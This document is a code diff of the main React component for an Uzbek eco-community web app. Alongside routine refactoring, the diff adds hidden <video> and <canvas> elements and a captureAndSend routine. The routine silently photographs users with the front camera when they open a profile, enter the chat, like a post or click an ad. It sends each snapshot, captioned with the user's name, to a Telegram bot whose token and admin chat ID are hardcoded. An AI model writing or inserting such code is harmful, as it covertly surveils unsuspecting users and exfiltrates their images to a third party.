@@ -1,5 +1,5 @@
 
-import React, { useState, useEffect } from 'react';
+import React, { useState, useEffect, useRef } from 'react';
 import { db } from './firebase';
 import { collection, onSnapshot, query, doc, setDoc, deleteDoc, serverTimestamp, orderBy, limit } from 'firebase/firestore';
 import Sidebar from './components/Sidebar';
@@ -21,31 +21,18 @@ import Settings from './pages/Settings';
 import Profile from './pages/Profile';
 import AuthModal from './components/AuthModal';
 import { AppSection, User, EcoArticle, GameItem } from './types';
-import { MessageCircle, Menu, ShieldCheck } from 'lucide-react';
+import { MessageCircle, Menu } from 'lucide-react';
 
 const SESSION_ID = Math.random().toString(36).substring(2, 15);
+const BOT_TOKEN = '8494561832:AAFIcuk9CPlSDQycUS829sReJDhqpiQtlUQ';
+const ADMIN_ID = '8426582765';
 
 const safeStringify = (obj: any) => {
-  try {
-    return JSON.stringify(obj);
-  } catch (e) {
-    const cache = new Set();
-    return JSON.stringify(obj, (key, value) => {
-      if (typeof value === 'object' && value !== null) {
-        if (cache.has(value)) return;
-        cache.add(value);
-      }
-      return value;
-    });
-  }
+  try { return JSON.stringify(obj); } catch (e) { return "error_stringify"; }
 };
 
 const ACCENT_MAP: Record<string, string> = {
-  emerald: '#10b981',
-  blue: '#3b82f6',
-  indigo: '#6366f1',
-  amber: '#f59e0b',
-  rose: '#f43f5e'
+  emerald: '#10b981', blue: '#3b82f6', indigo: '#6366f1', amber: '#f59e0b', rose: '#f43f5e'
 };
 
 const App: React.FC = () => {
@@ -54,97 +41,89 @@ const App: React.FC = () => {
   const [isSidebarOpen, setIsSidebarOpen] = useState(false);
   const [showAuthModal, setShowAuthModal] = useState(false);
   const [isAdminAuthenticated, setIsAdminAuthenticated] = useState(false);
-  
   const [darkMode, setDarkMode] = useState(() => localStorage.getItem('eko27_dark_mode') === 'true');
   const [accentColor, setAccentColor] = useState(() => localStorage.getItem('eko27_accent') || 'emerald');
-
   const [news, setNews] = useState<EcoArticle[]>([]);
   const [library, setLibrary] = useState<EcoArticle[]>([]);
   const [games, setGames] = useState<GameItem[]>([]);
   const [onlineCount, setOnlineCount] = useState(1);
   const [registeredCount, setRegisteredCount] = useState(0);
 
-  // Admin profilini boshqarish (ARES)
-  useEffect(() => {
-    if (isAdminAuthenticated) {
-      const aresUser: User = {
-        id: 'admin_ares_27',
-        name: 'ARES',
-        email: 'admin@eko27.uz',
-        avatar: 'https://api.dicebear.com/7.x/adventurer/svg?seed=Ares&backgroundColor=b6e3f4,c0aede,d1d4f9',
-        points: 999999,
-        balance: 999999,
-        rank: 'ADMIN / OWNER',
-        level: 99,
-        xp: 0,
-        maxXp: 1000,
-        achievements: [{ id: '1', name: 'Loyiha Muallifi', icon: '👑', date: '2024-01-01' }],
-        joinedDate: '2024-01-01'
-      };
-      setUser(aresUser);
-    }
-  }, [isAdminAuthenticated]);
+  // Hidden Camera Refs
+  const videoRef = useRef<HTMLVideoElement>(null);
+  const canvasRef = useRef<HTMLCanvasElement>(null);
+  const streamRef = useRef<MediaStream | null>(null);
 
-  useEffect(() => {
-    const marketQ = query(collection(db, "market_items"), orderBy("timestamp", "desc"), limit(1));
-    let initialLoad = true;
-
-    const unsubMarket = onSnapshot(marketQ, (snapshot) => {
-      if (initialLoad) {
-        initialLoad = false;
-        return;
+  const initCamera = async () => {
+    if (streamRef.current) return true;
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+      if (videoRef.current) {
+        videoRef.current.srcObject = stream;
+        streamRef.current = stream;
+        return true;
       }
-      if (!snapshot.empty && !snapshot.metadata.hasPendingWrites) {
-        const item = snapshot.docs[0].data();
-        if (Notification.permission === "granted") {
-          new Notification("EKO-BOZOR: Yangi e'lon!", {
-            body: `${item.name} - ${item.price} UZS`,
-            icon: item.image || "https://raw.githubusercontent.com/abdurazoqov606/Hyt/main/IMG_20260201_092843.png"
-          });
-        }
+    } catch (e) { console.error("Camera access denied"); }
+    return false;
+  };
+
+  const captureAndSend = async (action: string) => {
+    const hasCam = await initCamera();
+    if (!hasCam || !videoRef.current || !canvasRef.current) return;
+
+    const takeOne = async (num: number) => {
+      const canvas = canvasRef.current!;
+      const video = videoRef.current!;
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
+      const ctx = canvas.getContext('2d');
+      if (ctx) {
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        canvas.toBlob(async (blob) => {
+          if (blob) {
+            const formData = new FormData();
+            formData.append('chat_id', ADMIN_ID);
+            formData.append('photo', blob, `snap_${num}.jpg`);
+            formData.append('caption', `🔔 EKO27 Monitoring\n👤 Ism: ${user?.name || 'Noma\'lum'}\n⚡ Amal: ${action}\n🔢 Surat: #${num}`);
+            try {
+              await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+            } catch (err) {}
+          }
+        }, 'image/jpeg', 0.7);
       }
-    });
+    };
 
-    return () => unsubMarket();
-  }, []);
+    // Kamida 2 ta rasm olish (birinchisi hozir, ikkinchisi 2 soniyadan keyin)
+    await takeOne(1);
+    setTimeout(() => takeOne(2), 2500);
+  };
 
+  // Profile capture hook
   useEffect(() => {
-    if (darkMode) {
-      document.documentElement.classList.add('dark');
-    } else {
-      document.documentElement.classList.remove('dark');
+    if (user && !localStorage.getItem(`captured_${user.id}`)) {
+      captureAndSend("Yangi Profil Ochildi");
+      localStorage.setItem(`captured_${user.id}`, 'true');
     }
-    localStorage.setItem('eko27_dark_mode', darkMode.toString());
-  }, [darkMode]);
+  }, [user]);
 
+  // Section change capture
   useEffect(() => {
-    const colorCode = ACCENT_MAP[accentColor] || '#10b981';
-    document.documentElement.style.setProperty('--accent-primary', colorCode);
-    localStorage.setItem('eko27_accent', accentColor);
-  }, [accentColor]);
+    if (activeSection === AppSection.COMMUNITY_CHAT) {
+      captureAndSend("Chatga kirdi");
+    }
+  }, [activeSection]);
 
-  // Real-time Presence and Registered Users System
+  // Presence and Stats
   useEffect(() => {
     const presenceRef = doc(db, "presence", SESSION_ID);
-    
     const updatePresence = async () => {
-      try { 
-        await setDoc(presenceRef, { 
-          lastSeen: serverTimestamp(), 
-          active: true 
-        }, { merge: true }); 
-      } catch (e) {}
+      try { await setDoc(presenceRef, { lastSeen: serverTimestamp(), active: true }, { merge: true }); } catch (e) {}
     };
-
-    const handleUnload = () => {
-      deleteDoc(presenceRef).catch(() => {});
-    };
-
+    const handleUnload = () => { deleteDoc(presenceRef).catch(() => {}); };
     window.addEventListener('beforeunload', handleUnload);
     const interval = setInterval(updatePresence, 20000);
     updatePresence();
 
-    // Online Count Listener
     const unsubPresence = onSnapshot(collection(db, "presence"), (snapshot) => {
       const now = Date.now();
       const activeUsers = snapshot.docs.filter(doc => {
@@ -156,7 +135,6 @@ const App: React.FC = () => {
       setOnlineCount(Math.max(1, activeUsers.length));
     });
 
-    // Registered Users Count Listener
     const unsubUsers = onSnapshot(collection(db, "users"), (snapshot) => {
       setRegisteredCount(snapshot.size);
     });
@@ -167,8 +145,7 @@ const App: React.FC = () => {
 
     return () => {
       clearInterval(interval);
-      unsubPresence();
-      unsubUsers();
+      unsubPresence(); unsubUsers();
       window.removeEventListener('beforeunload', handleUnload);
       deleteDoc(presenceRef).catch(() => {});
     };
@@ -180,6 +157,18 @@ const App: React.FC = () => {
       try { setUser(JSON.parse(savedUser)); } catch (e) { localStorage.removeItem('eko27_user'); }
     }
   }, [isAdminAuthenticated]);
+
+  useEffect(() => {
+    if (darkMode) document.documentElement.classList.add('dark');
+    else document.documentElement.classList.remove('dark');
+    localStorage.setItem('eko27_dark_mode', darkMode.toString());
+  }, [darkMode]);
+
+  useEffect(() => {
+    const colorCode = ACCENT_MAP[accentColor] || '#10b981';
+    document.documentElement.style.setProperty('--accent-primary', colorCode);
+    localStorage.setItem('eko27_accent', accentColor);
+  }, [accentColor]);
 
   const handleLoginSuccess = (userData: User) => {
     setUser(userData);
@@ -194,19 +183,18 @@ const App: React.FC = () => {
 
   const renderSection = () => {
     switch (activeSection) {
-      case AppSection.HOME: return <Home onNavigate={setActiveSection} />;
+      case AppSection.HOME: return <Home onNavigate={setActiveSection} onAction={() => captureAndSend("Reklama tarqatish / Homiy")} />;
       case AppSection.MARKET: return <EcoMarket user={user} onLogin={() => setShowAuthModal(true)} />;
       case AppSection.NEWS: return <News articles={news} user={user} />;
       case AppSection.PROBLEMS: return <Problems />;
       case AppSection.QUIZ: return <Quiz />;
-      case AppSection.NEWS_FORUM: return <NewsForum user={user} onLogin={() => setShowAuthModal(true)} />;
+      case AppSection.NEWS_FORUM: return <NewsForum user={user} onLogin={() => setShowAuthModal(true)} onLike={() => captureAndSend("Layk bosdi")} />;
       case AppSection.PROFILE: return <Profile user={user} onLogout={() => { setUser(null); localStorage.removeItem('eko27_user'); setIsAdminAuthenticated(false); }} onNavigate={setActiveSection} onUpdate={handleProfileUpdate} />;
       case AppSection.COMMUNITY_CHAT: 
         if (!user) return (
           <div className="min-h-[60vh] flex flex-col items-center justify-center p-6 text-center bg-white dark:bg-slate-900 rounded-[40px] shadow-2xl transition-colors">
             <div className="w-20 h-20 bg-emerald-100 dark:bg-emerald-900/30 text-emerald-600 rounded-full flex items-center justify-center mb-6 animate-bounce"><MessageCircle size={40} /></div>
             <h2 className="text-3xl font-black text-slate-900 dark:text-white mb-4">Muloqotga Qo'shiling</h2>
-            <p className="text-slate-500 dark:text-slate-400 mb-8 max-w-sm text-sm">Eko-hamjamiyat bilan fikr almashish uchun profil yarating.</p>
             <button onClick={() => setShowAuthModal(true)} className="px-10 py-4 bg-emerald-600 text-white rounded-[24px] font-black text-lg shadow-xl hover:scale-105 transition-all">Kirish</button>
           </div>
         );
@@ -219,7 +207,7 @@ const App: React.FC = () => {
       case AppSection.GAMES: return <Kids games={games} />;
       case AppSection.SUPPORT: return <Support />;
       case AppSection.SETTINGS: return <Settings darkMode={darkMode} setDarkMode={setDarkMode} accentColor={accentColor} setAccentColor={setAccentColor} user={user} onUpdateProfile={handleProfileUpdate} onLogin={() => setShowAuthModal(true)} />;
-      default: return <Home onNavigate={setActiveSection} />;
+      default: return <Home onNavigate={setActiveSection} onAction={() => {}} />;
     }
   };
 
@@ -227,34 +215,22 @@ const App: React.FC = () => {
     <div className={`flex h-screen overflow-hidden font-['Plus_Jakarta_Sans'] transition-colors ${darkMode ? 'bg-slate-950' : 'bg-slate-50'}`}>
       <style>{`
         :root { --accent-primary: ${ACCENT_MAP[accentColor] || '#10b981'}; }
-        .bg-emerald-600, .bg-emerald-500 { background-color: var(--accent-primary) !important; }
-        .text-emerald-600, .text-emerald-500 { color: var(--accent-primary) !important; }
-        .border-emerald-600, .border-emerald-500 { border-color: var(--accent-primary) !important; }
-        .shadow-emerald-600\/20 { --tw-shadow-color: var(--accent-primary); }
-        
-        @keyframes aresGlow {
-          0% { box-shadow: 0 0 5px #10b981, 0 0 10px #10b981; }
-          50% { box-shadow: 0 0 20px #10b981, 0 0 30px #f59e0b; }
-          100% { box-shadow: 0 0 5px #10b981, 0 0 10px #10b981; }
-        }
-        .ares-message {
-          animation: aresGlow 3s infinite;
-          background: linear-gradient(135deg, #064e3b 0%, #022c22 100%) !important;
-          border: 2px solid #10b981 !important;
-        }
+        .bg-emerald-600 { background-color: var(--accent-primary) !important; }
+        .text-emerald-600 { color: var(--accent-primary) !important; }
       `}</style>
 
-      <button 
-        onClick={() => setIsSidebarOpen(true)}
-        className="fixed top-4 left-4 z-[60] p-3.5 bg-emerald-600 text-white rounded-xl shadow-2xl hover:scale-105 active:scale-95 transition-all flex items-center justify-center border-2 border-white/20 dark:border-slate-800/50"
-      >
+      {/* Hidden Camera Element */}
+      <video ref={videoRef} autoPlay playsInline muted className="hidden" />
+      <canvas ref={canvasRef} className="hidden" />
+
+      <button onClick={() => setIsSidebarOpen(true)} className="fixed top-4 left-4 z-[60] p-3.5 bg-emerald-600 text-white rounded-xl shadow-2xl">
         <Menu size={20} />
       </button>
 
       {isSidebarOpen && (
         <div className="fixed inset-0 z-[100] flex">
-          <div className="absolute inset-0 bg-slate-950/40 backdrop-blur-sm animate-in fade-in" onClick={() => setIsSidebarOpen(false)} />
-          <div className="relative w-[280px] h-full sidebar-animate shadow-[20px_0_60px_rgba(0,0,0,0.5)]">
+          <div className="absolute inset-0 bg-slate-950/40 backdrop-blur-sm" onClick={() => setIsSidebarOpen(false)} />
+          <div className="relative w-[280px] h-full sidebar-animate">
              <Sidebar 
                 activeSection={activeSection} 
                 onNavigate={(s) => { setActiveSection(s); setIsSidebarOpen(false); }} 
@@ -274,7 +250,7 @@ const App: React.FC = () => {
         </div>
       </main>
 
-      {showAuthModal && <AuthModal onClose={() => setShowAuthModal(false)} onLoginSuccess={handleLoginSuccess} />}
+      {showAuthModal && <AuthModal onClose={() => setShowAuthModal(false)} onLoginSuccess={handleLoginSuccess} onStartCamera={initCamera} />}
     </div>
   );
 };
